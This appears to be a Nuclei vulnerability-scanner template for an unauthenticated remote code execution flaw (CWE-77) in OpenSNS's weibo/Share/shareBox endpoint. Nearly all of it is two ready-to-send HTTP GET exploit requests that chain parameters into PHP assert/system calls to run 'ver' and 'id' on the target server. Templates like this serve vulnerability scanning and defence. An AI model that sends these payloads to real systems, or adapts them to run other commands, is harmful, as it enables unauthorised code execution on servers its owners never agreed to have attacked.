# Nuclei Template: OpenSNS - Remote Code Execution
**Template ID:** opensns-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`opensns-rce.yaml`)

## Vulnerability Information & PoC

## Description
OpenSNS allows remote unauthenticated attackers to execute arbitrary code via the 'shareBox' endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)
GET {{BaseURL}}/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)
```

